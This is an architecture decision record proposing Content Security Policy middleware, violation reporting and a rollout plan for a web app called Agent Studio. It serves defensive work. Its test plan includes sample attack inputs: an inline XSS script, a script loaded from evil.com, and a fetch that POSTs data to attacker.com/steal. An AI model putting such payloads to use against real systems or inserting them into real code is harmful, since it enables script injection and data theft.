# ADR-002: Content Security Policy (CSP) Implementation

**Status:** Proposed
**Date:** 2025-10-09
**Decision Maker:** Security Architecture Team
**Author:** Security Specialist Agent
**Related:** SECURITY_AUDIT_REPORT.md (Critical Finding #2)

---

## Context and Problem Statement

Agent Studio currently lacks Content Security Policy (CSP) headers, leaving the application vulnerable to Cross-Site Scripting (XSS), clickjacking, and code injection attacks. Without CSP, malicious scripts can be injected and executed in the context of trusted users, potentially stealing credentials, modifying agent configurations, or exfiltrating sensitive data.

**Current Implementation Risks:**
- **CVSS Score**: 8.6 (Critical)
- **OWASP Category**: A03:2021 - Injection
- **CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers)
- **Threat Actor**: External attackers exploiting XSS vulnerabilities, malicious third-party scripts
- **Attack Vectors**:
  - Inline script injection via vulnerable input fields
  - Malicious external scripts from compromised CDNs
  - Data exfiltration to attacker-controlled domains
  - Clickjacking via iframe embedding

**Business Impact:**
- **Data Breach**: Stolen Azure OpenAI API keys, agent configurations, workflow data
- **Malicious Agent Deployment**: Injection of harmful workflows
- **Regulatory Non-Compliance**: GDPR Article 32 (inadequate security measures)
- **Reputation Damage**: Customer trust erosion from security incidents

---

## Decision Drivers

1. **Security Priority**: Mitigate XSS and injection attacks via defense-in-depth
2. **Industry Standards**: OWASP CSP recommendations, Mozilla Observatory
3. **Compliance**: GDPR Article 32, SOC2 CC6.6 (Logical Access Security)
4. **Browser Compatibility**: CSP Level 2/3 support across modern browsers
5. **Developer Experience**: Allow development flexibility while enforcing production security
6. **Performance**: Minimal impact on application performance
7. **Maintainability**: Clear policy structure, violation reporting for continuous improvement

---

## Considered Options

### Option 1: No CSP (Status Quo)
**Rejected** - Unacceptable security risk

**Pros:**
- No implementation effort
- No restrictions on resource loading

**Cons:**
- ❌ Vulnerable to XSS attacks (CRITICAL)
- ❌ No protection against clickjacking
- ❌ Fails security compliance requirements
- ❌ Production blocker per security audit

### Option 2: CSP via Meta Tag (Interim Solution)
**Status:** Short-term fallback if backend deployment blocked

**Architecture:**
```html
<head>
  <meta http-equiv="Content-Security-Policy" content="...policy...">
</head>
```

**Pros:**
- ✅ Quick implementation (no backend changes)
- ✅ Immediate XSS mitigation
- ✅ Works for React SPA

**Cons:**
- ⚠️ Limited policy directives (no `frame-ancestors`, `report-uri`)
- ⚠️ Cannot enforce report-only mode
- ⚠️ Less flexible than HTTP headers

### Option 3: CSP via HTTP Headers (.NET Middleware) - RECOMMENDED
**Status:** RECOMMENDED DECISION

**Architecture:**
```
┌─────────────────────────────────────────────────────────┐
│           Browser Request to Agent Studio                │
└────────────────────┬────────────────────────────────────┘
                     │
                     ↓
┌─────────────────────────────────────────────────────────┐
│         .NET API Middleware Pipeline                     │
├─────────────────────────────────────────────────────────┤
│  1. CSP Middleware                                       │
│     - Generate nonce for inline scripts/styles          │
│     - Set Content-Security-Policy header                │
│     - Configure report-uri endpoint                     │
├─────────────────────────────────────────────────────────┤
│  2. Security Headers Middleware                          │
│     - X-Frame-Options, X-Content-Type-Options           │
│     - Strict-Transport-Security, etc.                   │
└────────────────────┬────────────────────────────────────┘
                     │
                     ↓
┌─────────────────────────────────────────────────────────┐
│         Response with CSP Header                         │
├─────────────────────────────────────────────────────────┤
│  Content-Security-Policy:                                │
│    default-src 'self';                                   │
│    script-src 'self' 'nonce-{random}';                   │
│    style-src 'self' 'nonce-{random}';                    │
│    img-src 'self' data: https:;                          │
│    connect-src 'self' wss://*.signalr.net;               │
│    frame-ancestors 'none';                               │
│    report-uri /api/csp-report                            │
└─────────────────────────────────────────────────────────┘
                     │
                     ↓
┌─────────────────────────────────────────────────────────┐
│    React App Renders with Nonce-Protected Scripts       │
│    - Inline scripts include nonce attribute              │
│    - External scripts from approved domains only         │
│    - CSP violations logged and reported                  │
└─────────────────────────────────────────────────────────┘
```

**Pros:**
- ✅ Full CSP directive support (including `frame-ancestors`)
- ✅ Report-only mode for gradual rollout
- ✅ Dynamic nonce generation for inline scripts
- ✅ Centralized policy management (middleware)
- ✅ CSP violation reporting endpoint
- ✅ Industry best practice (OWASP recommended)

**Cons:**
- ⚠️ Requires backend middleware implementation
- ⚠️ Frontend must handle nonce injection for inline scripts
- ⚠️ Vite build configuration updates required

### Option 4: CSP with Nonce + Hash-Based Integrity
**Status:** Future enhancement (Phase 2)

**Pros:**
- Strongest security (eliminate `unsafe-inline` completely)
- Supports progressive hardening

**Cons:**
- ❌ Complex implementation (hash calculation for all inline scripts)
- ❌ Extended timeline (3+ weeks)
- ⚠️ Defer to Phase 2 (post-production launch)

---

## Decision Outcome

**Chosen Option:** **Option 3 - CSP via HTTP Headers (.NET Middleware)**

This solution provides comprehensive XSS and injection attack protection while maintaining flexibility for legitimate application functionality. The middleware approach enables centralized policy management, violation reporting, and gradual hardening via report-only mode.

---

## Implementation Specification

### Phase 1: .NET Middleware Implementation

#### 1.1 CSP Middleware with Nonce Generation

**File:** `services/dotnet/AgentStudio.Api/Middleware/ContentSecurityPolicyMiddleware.cs`

```csharp
using System.Security.Cryptography;
using System.Text;
using Microsoft.AspNetCore.Http;

namespace AgentStudio.Api.Middleware;

/// <summary>
/// Content Security Policy middleware establishing XSS protection across the platform.
/// Designed for: Organizations requiring defense-in-depth security against code injection attacks.
/// </summary>
public class ContentSecurityPolicyMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<ContentSecurityPolicyMiddleware> _logger;
    private readonly IWebHostEnvironment _environment;
    private readonly CspConfiguration _config;

    public ContentSecurityPolicyMiddleware(
        RequestDelegate next,
        ILogger<ContentSecurityPolicyMiddleware> logger,
        IWebHostEnvironment environment,
        IConfiguration configuration)
    {
        _next = next;
        _logger = logger;
        _environment = environment;
        _config = configuration.GetSection("ContentSecurityPolicy").Get<CspConfiguration>()
            ?? new CspConfiguration();
    }

    public async Task InvokeAsync(HttpContext context)
    {
        // Generate cryptographic nonce for this request
        var nonce = GenerateNonce();

        // Store nonce in HttpContext for access by views/pages
        context.Items["csp-nonce"] = nonce;

        // Build CSP policy string
        var policy = BuildCspPolicy(nonce);

        // Set CSP header (report-only mode for development, enforcing for production)
        var headerName = ShouldUseReportOnly()
            ? "Content-Security-Policy-Report-Only"
            : "Content-Security-Policy";

        context.Response.Headers.Add(headerName, policy);

        _logger.LogDebug(
            "CSP {Mode} applied with nonce: {Nonce}",
            ShouldUseReportOnly() ? "Report-Only" : "Enforcing",
            nonce
        );

        await _next(context);
    }

    /// <summary>
    /// Generates cryptographically secure nonce for inline script/style protection.
    /// </summary>
    private static string GenerateNonce()
    {
        var bytes = new byte[32]; // 256 bits
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(bytes);
        return Convert.ToBase64String(bytes);
    }

    /// <summary>
    /// Builds Content Security Policy directive string based on environment and configuration.
    /// </summary>
    private string BuildCspPolicy(string nonce)
    {
        var directives = new Dictionary<string, string>();

        // Default source: self only
        directives["default-src"] = "'self'";

        // Script sources: self + nonce for inline scripts
        var scriptSources = new List<string> { "'self'", $"'nonce-{nonce}'" };

        if (_config.AllowUnsafeEval || _environment.IsDevelopment())
        {
            scriptSources.Add("'unsafe-eval'"); // Required for Vite HMR in dev
        }

        if (_config.AllowedScriptDomains?.Any() == true)
        {
            scriptSources.AddRange(_config.AllowedScriptDomains);
        }

        directives["script-src"] = string.Join(" ", scriptSources);

        // Style sources: self + nonce for inline styles
        var styleSources = new List<string> { "'self'", $"'nonce-{nonce}'" };

        if (_config.AllowedStyleDomains?.Any() == true)
        {
            styleSources.AddRange(_config.AllowedStyleDomains);
        }

        directives["style-src"] = string.Join(" ", styleSources);

        // Image sources: self, data URIs, HTTPS
        var imageSources = new List<string> { "'self'", "data:", "https:" };
        if (_config.AllowedImageDomains?.Any() == true)
        {
            imageSources.AddRange(_config.AllowedImageDomains);
        }
        directives["img-src"] = string.Join(" ", imageSources);

        // Font sources
        var fontSources = new List<string> { "'self'", "data:" };
        if (_config.AllowedFontDomains?.Any() == true)
        {
            fontSources.AddRange(_config.AllowedFontDomains);
        }
        directives["font-src"] = string.Join(" ", fontSources);

        // Connect sources (AJAX, WebSocket)
        var connectSources = new List<string> { "'self'" };

        // Add Azure OpenAI domains if configured
        if (_config.AllowAzureOpenAI)
        {
            connectSources.Add("https://*.openai.azure.com");
        }

        // Add SignalR domains
        if (_config.AllowSignalR)
        {
            connectSources.Add("wss://*.signalr.net");
            connectSources.Add("https://*.signalr.net");
        }

        if (_config.AllowedConnectDomains?.Any() == true)
        {
            connectSources.AddRange(_config.AllowedConnectDomains);
        }

        directives["connect-src"] = string.Join(" ", connectSources);

        // Frame sources (iframes)
        directives["frame-src"] = _config.AllowFrames ? "'self'" : "'none'";

        // Frame ancestors (clickjacking protection)
        directives["frame-ancestors"] = "'none'"; // Never allow embedding

        // Object/embed sources (Flash, plugins)
        directives["object-src"] = "'none'";

        // Base URI restriction
        directives["base-uri"] = "'self'";

        // Form action restriction
        directives["form-action"] = "'self'";

        // Upgrade insecure requests (HTTP -> HTTPS)
        if (!_environment.IsDevelopment())
        {
            directives["upgrade-insecure-requests"] = string.Empty;
        }

        // Report URI for CSP violations
        if (!string.IsNullOrEmpty(_config.ReportUri))
        {
            directives["report-uri"] = _config.ReportUri;
        }

        // Build policy string
        var policyParts = directives
            .Where(d => !string.IsNullOrEmpty(d.Value))
            .Select(d => string.IsNullOrEmpty(d.Value.Trim())
                ? d.Key
                : $"{d.Key} {d.Value}");

        return string.Join("; ", policyParts);
    }

    /// <summary>
    /// Determines whether to use report-only mode (development) or enforcing mode (production).
    /// </summary>
    private bool ShouldUseReportOnly()
    {
        // Use report-only in development or if explicitly configured
        return _environment.IsDevelopment() || _config.ReportOnlyMode;
    }
}

/// <summary>
/// Configuration options for Content Security Policy.
/// </summary>
public class CspConfiguration
{
    /// <summary>
    /// Enable report-only mode (violations logged but not blocked).
    /// </summary>
    public bool ReportOnlyMode { get; set; } = false;

    /// <summary>
    /// Allow 'unsafe-eval' for script-src (required for Vite HMR in development).
    /// </summary>
    public bool AllowUnsafeEval { get; set; } = false;

    /// <summary>
    /// Allow iframe embedding within the application.
    /// </summary>
    public bool AllowFrames { get; set; } = false;

    /// <summary>
    /// Allow Azure OpenAI API connections.
    /// </summary>
    public bool AllowAzureOpenAI { get; set; } = true;

    /// <summary>
    /// Allow SignalR real-time connections.
    /// </summary>
    public bool AllowSignalR { get; set; } = true;

    /// <summary>
    /// Endpoint to receive CSP violation reports.
    /// </summary>
    public string? ReportUri { get; set; } = "/api/csp-violations";

    /// <summary>
    /// Additional allowed domains for script-src.
    /// </summary>
    public string[]? AllowedScriptDomains { get; set; }

    /// <summary>
    /// Additional allowed domains for style-src.
    /// </summary>
    public string[]? AllowedStyleDomains { get; set; }

    /// <summary>
    /// Additional allowed domains for img-src.
    /// </summary>
    public string[]? AllowedImageDomains { get; set; }

    /// <summary>
    /// Additional allowed domains for font-src.
    /// </summary>
    public string[]? AllowedFontDomains { get; set; }

    /// <summary>
    /// Additional allowed domains for connect-src.
    /// </summary>
    public string[]? AllowedConnectDomains { get; set; }
}

/// <summary>
/// Extension methods for CSP middleware registration.
/// </summary>
public static class ContentSecurityPolicyMiddlewareExtensions
{
    public static IApplicationBuilder UseContentSecurityPolicy(this IApplicationBuilder builder)
    {
        return builder.UseMiddleware<ContentSecurityPolicyMiddleware>();
    }
}
```

#### 1.2 CSP Violation Reporting Endpoint

**File:** `services/dotnet/AgentStudio.Api/Controllers/CspViolationController.cs`

```csharp
using Microsoft.AspNetCore.Mvc;

namespace AgentStudio.Api.Controllers;

/// <summary>
/// Endpoint for receiving Content Security Policy violation reports.
/// Designed for: Monitoring and analyzing CSP violations to strengthen security posture.
/// </summary>
[ApiController]
[Route("api/csp-violations")]
public class CspViolationController : ControllerBase
{
    private readonly ILogger<CspViolationController> _logger;

    public CspViolationController(ILogger<CspViolationController> logger)
    {
        _logger = logger;
    }

    /// <summary>
    /// Receives and logs CSP violation reports from browsers.
    /// </summary>
    [HttpPost]
    [ProducesResponseType(StatusCodes.Status204NoContent)]
    public IActionResult ReportViolation([FromBody] CspViolationReport report)
    {
        if (report?.CspReport == null)
        {
            return NoContent();
        }

        // Log violation for analysis
        _logger.LogWarning(
            "CSP Violation: {Directive} blocked {Url} on {Page} (referrer: {Referrer})",
            report.CspReport.ViolatedDirective,
            report.CspReport.BlockedUri,
            report.CspReport.DocumentUri,
            report.CspReport.Referrer
        );

        // Optional: Store in database for trending analysis
        // await _cspViolationRepository.SaveViolationAsync(report);

        // Optional: Alert on critical violations (e.g., 'script-src' violations)
        if (report.CspReport.ViolatedDirective?.Contains("script-src") == true)
        {
            _logger.LogError(
                "CRITICAL CSP Violation: Script blocked from {Url}",
                report.CspReport.BlockedUri
            );
            // Trigger security alert
        }

        return NoContent(); // Return 204 No Content (standard for CSP reports)
    }
}

/// <summary>
/// CSP violation report structure as sent by browsers.
/// </summary>
public class CspViolationReport
{
    [System.Text.Json.Serialization.JsonPropertyName("csp-report")]
    public CspReportDetails? CspReport { get; set; }
}

public class CspReportDetails
{
    [System.Text.Json.Serialization.JsonPropertyName("document-uri")]
    public string? DocumentUri { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("referrer")]
    public string? Referrer { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("violated-directive")]
    public string? ViolatedDirective { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("effective-directive")]
    public string? EffectiveDirective { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("original-policy")]
    public string? OriginalPolicy { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("blocked-uri")]
    public string? BlockedUri { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("status-code")]
    public int StatusCode { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("source-file")]
    public string? SourceFile { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("line-number")]
    public int? LineNumber { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("column-number")]
    public int? ColumnNumber { get; set; }
}
```

#### 1.3 Configuration Setup

**File:** `services/dotnet/AgentStudio.Api/appsettings.json`

```json
{
  "ContentSecurityPolicy": {
    "ReportOnlyMode": false,
    "AllowUnsafeEval": false,
    "AllowFrames": false,
    "AllowAzureOpenAI": true,
    "AllowSignalR": true,
    "ReportUri": "/api/csp-violations",
    "AllowedScriptDomains": [],
    "AllowedStyleDomains": [
      "https://fonts.googleapis.com"
    ],
    "AllowedImageDomains": [
      "https://*.blob.core.windows.net"
    ],
    "AllowedFontDomains": [
      "https://fonts.gstatic.com"
    ],
    "AllowedConnectDomains": []
  }
}
```

**File:** `services/dotnet/AgentStudio.Api/appsettings.Development.json`

```json
{
  "ContentSecurityPolicy": {
    "ReportOnlyMode": true,
    "AllowUnsafeEval": true,
    "AllowFrames": true,
    "ReportUri": "/api/csp-violations"
  }
}
```

#### 1.4 Middleware Registration

**File:** `services/dotnet/AgentStudio.Api/Program.cs`

```csharp
// Add after HTTPS redirection, before CORS
app.UseHttpsRedirection();
app.UseContentSecurityPolicy(); // Add CSP middleware
app.UseCors();
```

---

### Phase 2: Frontend (React/Vite) Implementation

#### 2.1 Vite Configuration for CSP Nonces

**File:** `webapp/vite.config.ts`

```typescript
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

// https://vitejs.dev/config/
export default defineConfig(({ mode }) => ({
  plugins: [
    react(),
    // CSP nonce injection for production builds
    mode === 'production' && {
      name: 'csp-nonce-placeholder',
      transformIndexHtml(html) {
        // Replace script tags with nonce placeholder
        // Backend will inject actual nonce value
        return html.replace(
          /<script/g,
          '<script nonce="{{CSP_NONCE}}"'
        );
      },
    },
  ].filter(Boolean),
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  server: {
    port: 5173,
    host: true,
    proxy: {
      '/api': {
        target: 'http://localhost:5000',
        changeOrigin: true,
        secure: false,
      },
      '/hubs': {
        target: 'http://localhost:5000',
        changeOrigin: true,
        secure: false,
        ws: true,
      },
    },
  },
  build: {
    outDir: 'dist',
    sourcemap: true,
    // Ensure consistent chunk naming for CSP hash calculation (future)
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom', 'react-router-dom'],
          ui: ['@tanstack/react-query', 'zustand'],
        },
      },
    },
  },
}));
```

#### 2.2 Index.html with Nonce Placeholder

**File:** `webapp/index.html`

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Agent Studio - Build, deploy, and manage AI agents on Azure" />

    <!-- CSP Nonce will be injected by backend -->
    <!-- Production builds: Backend replaces {{CSP_NONCE}} with actual nonce -->

    <title>Agent Studio</title>
  </head>
  <body>
    <div id="root"></div>
    <!-- Vite will inject scripts with nonce attribute in production -->
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

#### 2.3 CSP-Compliant Inline Styles (Avoid)

For any necessary inline styles, use external stylesheets or CSS modules instead:

```typescript
// ❌ AVOID: Inline styles (CSP violation)
<div style={{ backgroundColor: 'red' }}>Content</div>

// ✅ USE: CSS modules or Tailwind classes
<div className="bg-red-500">Content</div>

// ✅ USE: External stylesheet
import './styles.css';
<div className="custom-style">Content</div>
```

#### 2.4 Remove Inline Event Handlers

```typescript
// ❌ AVOID: Inline event handlers (CSP violation)
<button onclick="handleClick()">Click me</button>

// ✅ USE: React event handlers
<button onClick={handleClick}>Click me</button>
```

---

## Security Controls

### CSP Directives Explained

| Directive | Configuration | Purpose |
|-----------|---------------|---------|
| `default-src 'self'` | Fallback for all unspecified directives | Restrict all resources to same origin by default |
| `script-src 'self' 'nonce-{random}'` | Scripts from same origin + nonce-protected inline | Prevent XSS via malicious scripts |
| `style-src 'self' 'nonce-{random}'` | Styles from same origin + nonce-protected inline | Prevent CSS-based attacks |
| `img-src 'self' data: https:` | Images from same origin, data URIs, HTTPS sources | Allow legitimate image loading |
| `connect-src 'self' wss://*.signalr.net` | AJAX/WebSocket to same origin + SignalR | Control API/WebSocket connections |
| `font-src 'self' https://fonts.gstatic.com` | Fonts from same origin + Google Fonts | Allow web font loading |
| `frame-ancestors 'none'` | No iframe embedding allowed | Prevent clickjacking attacks |
| `object-src 'none'` | No Flash/plugin content | Prevent plugin-based attacks |
| `base-uri 'self'` | Restrict base tag to same origin | Prevent base tag injection |
| `form-action 'self'` | Forms can only submit to same origin | Prevent form hijacking |
| `upgrade-insecure-requests` | Upgrade HTTP to HTTPS | Enforce HTTPS for all resources |
| `report-uri /api/csp-violations` | CSP violation reporting endpoint | Monitor and analyze policy violations |

### Threat Mitigation Mapping

| Threat | CSP Control | Mitigation Level |
|--------|-------------|------------------|
| **XSS via inline scripts** | `script-src 'nonce-{random}'` | ✅ CRITICAL - Blocked |
| **XSS via external scripts** | `script-src 'self'` | ✅ CRITICAL - Limited to trusted domains |
| **Data exfiltration** | `connect-src 'self'` | ✅ HIGH - Restricted to approved APIs |
| **Clickjacking** | `frame-ancestors 'none'` | ✅ HIGH - Embedding blocked |
| **CSS injection attacks** | `style-src 'nonce-{random}'` | ✅ MEDIUM - Inline styles controlled |
| **Mixed content (HTTP/HTTPS)** | `upgrade-insecure-requests` | ✅ MEDIUM - HTTPS enforced |
| **Base tag injection** | `base-uri 'self'` | ✅ LOW - Base tag restricted |

---

## Progressive Hardening Roadmap

### Phase 1: Initial Deployment (Week 1)
**Goal:** Establish baseline CSP with report-only mode

**Configuration:**
```json
{
  "ReportOnlyMode": true,
  "AllowUnsafeEval": true,
  "AllowedScriptDomains": []
}
```

**Actions:**
1. Deploy CSP middleware to staging
2. Monitor violation reports for 3-5 days
3. Identify legitimate violations requiring policy updates
4. Update `AllowedScriptDomains` / `AllowedStyleDomains` as needed

**Success Criteria:**
- Zero violations from legitimate application usage
- All third-party domains identified and whitelisted

### Phase 2: Enforcing Mode (Week 2)
**Goal:** Enable CSP enforcement, block actual violations

**Configuration:**
```json
{
  "ReportOnlyMode": false,
  "AllowUnsafeEval": true,
  "AllowedScriptDomains": ["https://cdn.example.com"]
}
```

**Actions:**
1. Switch to enforcing mode in production
2. Monitor application functionality for breakage
3. Address any false positives immediately
4. Maintain violation monitoring

**Success Criteria:**
- No functional regressions
- Violation reports < 1% of total requests

### Phase 3: Remove 'unsafe-eval' (Week 4)
**Goal:** Eliminate dynamic code evaluation

**Configuration:**
```json
{
  "ReportOnlyMode": false,
  "AllowUnsafeEval": false
}
```

**Actions:**
1. Audit codebase for `eval()`, `Function()` usage
2. Refactor dynamic code execution patterns
3. Test Vite production builds without HMR
4. Deploy to production

**Success Criteria:**
- Application fully functional without `unsafe-eval`
- No violations related to eval usage

### Phase 4: Hash-Based Integrity (Month 3)
**Goal:** Replace nonces with SRI hashes for static resources

**Configuration:**
```json
{
  "UseSubresourceIntegrity": true
}
```

**Actions:**
1. Generate SRI hashes for all static JS/CSS
2. Update HTML templates with integrity attributes
3. Implement hash verification in CSP
4. Remove nonce reliance for static resources

**Success Criteria:**
- All static resources protected by SRI hashes
- CSP policy simplified (fewer nonce dependencies)

---

## Testing & Validation

### CSP Test Plan

**Test Case 1: Inline Script Blocking**
```html
<!-- Attempt to inject malicious inline script -->
<script>alert('XSS')</script>
```
**Expected Result:** ✅ Blocked by CSP (script-src violation)

**Test Case 2: External Script from Untrusted Domain**
```html
<script src="https://evil.com/malicious.js"></script>
```
**Expected Result:** ✅ Blocked by CSP (script-src violation)

**Test Case 3: Nonce-Protected Inline Script**
```html
<script nonce="{{CSP_NONCE}}">
  console.log('Legitimate script');
</script>
```
**Expected Result:** ✅ Allowed (nonce matches)

**Test Case 4: Clickjacking Prevention**
```html
<!-- External site attempting to embed Agent Studio -->
<iframe src="https://agentstudio.com"></iframe>
```
**Expected Result:** ✅ Blocked by CSP (frame-ancestors violation)

**Test Case 5: Data Exfiltration Attempt**
```javascript
// Attempt to send data to external domain
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ data: 'sensitive' })
});
```
**Expected Result:** ✅ Blocked by CSP (connect-src violation)

**Test Case 6: CSP Violation Reporting**
```javascript
// Trigger violation and verify reporting
const img = document.createElement('img');
img.src = 'https://untrusted.com/image.jpg';
document.body.appendChild(img);
```
**Expected Result:** ✅ Violation logged to `/api/csp-violations`

### Browser Compatibility Testing

| Browser | CSP Level | Supported Directives | Notes |
|---------|-----------|---------------------|-------|
| Chrome 90+ | CSP Level 3 | All directives | ✅ Full support |
| Firefox 88+ | CSP Level 3 | All directives | ✅ Full support |
| Safari 15+ | CSP Level 2 | Most directives | ⚠️ Limited `report-uri` support |
| Edge 90+ | CSP Level 3 | All directives | ✅ Full support (Chromium-based) |

### Automated Testing

```typescript
// webapp/src/__tests__/csp.test.ts
import { describe, it, expect, beforeAll } from 'vitest';

describe('Content Security Policy', () => {
  let cspHeader: string;

  beforeAll(async () => {
    const response = await fetch('/api/auth/me');
    cspHeader = response.headers.get('Content-Security-Policy') || '';
  });

  it('should include script-src directive', () => {
    expect(cspHeader).toContain("script-src 'self'");
  });

  it('should include frame-ancestors none', () => {
    expect(cspHeader).toContain("frame-ancestors 'none'");
  });

  it('should include report-uri', () => {
    expect(cspHeader).toContain('report-uri /api/csp-violations');
  });

  it('should not allow unsafe-inline in production', () => {
    if (process.env.NODE_ENV === 'production') {
      expect(cspHeader).not.toContain("'unsafe-inline'");
    }
  });
});
```

---

## Monitoring & Observability

### CSP Violation Metrics

```csharp
// Track violations by directive type
_metrics.IncrementCounter(
    "csp.violations.total",
    new Dictionary<string, object>
    {
        { "directive", report.CspReport.ViolatedDirective },
        { "page", report.CspReport.DocumentUri }
    }
);
```

### Alerts

- **Critical**: script-src violations > 10/hour (potential XSS attack)
- **Warning**: connect-src violations > 50/hour (potential data exfiltration)
- **Info**: CSP violation rate spike (>2x baseline)

### Dashboard Queries (Application Insights)

```kusto
// Top 10 violated directives
traces
| where message contains "CSP Violation"
| extend directive = extract("Directive: ([^,]+)", 1, message)
| summarize count() by directive
| top 10 by count_ desc

// Violations by blocked URI
traces
| where message contains "blocked"
| extend blockedUri = extract("blocked ([^ ]+)", 1, message)
| summarize count() by blockedUri
| top 10 by count_ desc
```

---

## Migration Strategy

### Rollout Plan

**Week 1: Report-Only Mode (Staging)**
- Deploy CSP middleware to staging
- Enable report-only mode
- Monitor violations for 5 days
- Whitelist legitimate third-party domains

**Week 2: Enforcing Mode (Staging)**
- Switch to enforcing mode in staging
- Test all application features
- Address any false positives
- Verify no functional regressions

**Week 3: Production Deployment**
- Deploy CSP middleware to production (report-only)
- Monitor production violations for 3 days
- Switch to enforcing mode if clean
- Maintain rollback plan (disable CSP via config)

**Rollback Plan:**
```json
// Emergency rollback: Disable CSP entirely
{
  "ContentSecurityPolicy": {
    "Enabled": false
  }
}
```

---

## Compliance Mapping

| Requirement | Control | Verification |
|------------|---------|--------------|
| **GDPR Article 32** (Security Measures) | CSP mitigates XSS/injection attacks | ✅ CSP enforcing mode active |
| **OWASP A03:2021** (Injection) | CSP blocks unauthorized scripts | ✅ script-src restricted |
| **SOC2 CC6.6** (Logical Access Security) | Defense-in-depth XSS protection | ✅ Multi-layer CSP directives |
| **PCI-DSS 6.5.7** (XSS Prevention) | CSP + output encoding | ✅ CSP + React auto-escaping |

---

## References

- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [Mozilla Observatory](https://observatory.mozilla.org/)
- [CWE-1021: Improper Restriction of Rendered UI Layers](https://cwe.mitre.org/data/definitions/1021.html)

---

**Document Classification:** Internal - Security Architecture
**Contact:** Consultations@BrooksideBI.com | +1 209 487 2047
